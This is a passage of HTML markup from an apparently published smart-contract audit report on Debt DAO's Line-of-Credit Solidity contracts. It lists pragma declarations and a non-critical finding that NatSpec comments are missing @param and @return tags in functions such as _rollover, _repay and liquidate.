class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"86\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineFactoryLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">0</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineFactoryLib.sol#L0\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineFactoryLib.sol#L0</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"87\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">0</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L0\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L0</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"88\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MutualConsent</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">0</span><span class=\"mtk1\">:    </span><span class=\"mtk3\">// forked from https://github.com/IndexCoop/index-coop-smart-contracts/blob/master/contracts/lib/MutualConsent.sol</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L0\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L0</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"89\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotedLineLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">0</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L0\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L0</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"90\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">0</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L0\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L0</a></p>\n<h2 id=\"n15--natspec-is-incomplete\" style=\"position:relative;\"><a href=\"#n15--natspec-is-incomplete\" aria-label=\"n15  natspec is incomplete permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑15]  NatSpec is incomplete</h2>\n<p><em>There are 56 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"91\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EscrowedLine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param newLine&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">82</span><span class=\"mtk1\">      </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">83       * see SecuredlLine.rollover</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">84       * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> helper function to allow borrower to easily swithc collateral to a new Line after repyment</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">85       *(</span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> priviliegad internal function.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">86       * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> MUST only be callable if line is REPAID</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">87       * </span><span class=\"mtk4\">@return</span><span class=\"mtk3\"> - if function successfully executed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">88      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">89</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_rollover</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newLine</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/EscrowedLine.sol#L82-L89\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/EscrowedLine.sol#L82-L89</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"92\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineOfCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@return&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">216</span><span class=\"mtk1\">         @</span><span class=\"mtk12\">param</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">217</span><span class=\"mtk1\">       */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">218</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_accrue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Credit</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Credit</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param status_&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">415</span><span class=\"mtk1\">       </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">416         * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> - updates `status` variable in storage if current status is diferent from existing status.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">417         * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> - privileged internal function. MUST check params and logic flow before calling</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">418         * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> - does not save new status if it is the same as current status</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">419         * </span><span class=\"mtk4\">@return</span><span class=\"mtk3\"> status - the current status of the line after updating</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">420        */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">421</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_updateStatus</span><span class=\"mtk1\">(LineLib.STATUS </span><span class=\"mtk12\">status_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(LineLib.STATUS) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@return&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">433</span><span class=\"mtk1\">        * @</span><span class=\"mtk12\">param</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> </span><span class=\"mtk4\">of</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokens</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lender</span><span class=\"mtk1\"> </span><span class=\"mtk12\">will</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initially</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deposit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">434</span><span class=\"mtk1\">       */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">435</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_createCredit</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">436           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">437           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">438           </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">439       )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">440           </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">441:          </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param credit&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">456     </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">457      * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> - Reduces `principal` and/or `interestAccrued` on a credit line.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">458               Expects checks for conditions of repaying and param sanitizing before calling</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">459               e.g. early repayment of principal, tokens have actually been paid by borrower, etc.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">460      * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> - privileged internal function. MUST check params and logic flow before calling</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">461      * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">id</span><span class=\"mtk3\"> - position id with all data pertaining to line</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">462      * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk3\"> - amount of Credit Token being repaid on credit line</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">463      * </span><span class=\"mtk4\">@return</span><span class=\"mtk3\"> credit - position struct in memory with updated values</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">464     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">465       </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_repay</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Credit</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">466           </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">467:          </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">Credit</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param credit&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param id&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">477       </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">478        * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> - checks that a credit line is fully repaid and removes it</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">479        * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> deletes credit storage. Store any data u might need later in call before _close()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">480        * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> - privileged internal function. MUST check params and logic flow before calling</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">481        * </span><span class=\"mtk4\">@return</span><span class=\"mtk3\"> credit - position struct in memory with updated values</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">482        */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">483:      </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_close</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Credit</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L216-L218\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L216-L218</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"93\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SecuredLine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@return&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">77</span><span class=\"mtk1\">       * @</span><span class=\"mtk12\">param</span><span class=\"mtk1\"> </span><span class=\"mtk12\">targetToken</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> </span><span class=\"mtk4\">in</span><span class=\"mtk1\"> </span><span class=\"mtk12\">escrow</span><span class=\"mtk1\"> </span><span class=\"mtk12\">that</span><span class=\"mtk1\"> </span><span class=\"mtk12\">will</span><span class=\"mtk1\"> </span><span class=\"mtk12\">be</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sold</span><span class=\"mtk1\"> </span><span class=\"mtk4\">of</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">repay</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">78</span><span class=\"mtk1\">       */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">79</span><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">80</span><span class=\"mtk1\">      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">liquidate</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">81        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">82        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">targetToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">83      )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">84        </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">85        </span><span class=\"mtk11\">whileBorrowing</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">86:       </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L77-L86\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L77-L86</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"94\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">escrow</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Escrow</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param _line&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">69</span><span class=\"mtk1\">        </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">70        * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> - Allows current owner to transfer ownership to another address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">71        * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\">    - Used if we setup Escrow before Line exists. Line has no way to interface with this function so once transfered `line` is set forever</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">72        * </span><span class=\"mtk4\">@return</span><span class=\"mtk3\"> didUpdate - if function successfully executed or not</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">73        */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">74</span><span class=\"mtk1\">:       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateLine</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_line</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@return&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">98</span><span class=\"mtk1\">         * @</span><span class=\"mtk12\">param</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">all</span><span class=\"mtk1\"> </span><span class=\"mtk12\">borrow</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deposit</span><span class=\"mtk1\"> </span><span class=\"mtk15\">as</span><span class=\"mtk1\"> </span><span class=\"mtk10\">collateral</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">99</span><span class=\"mtk1\">         */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">100</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">enableCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L69-L74\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L69-L74</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"95\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span 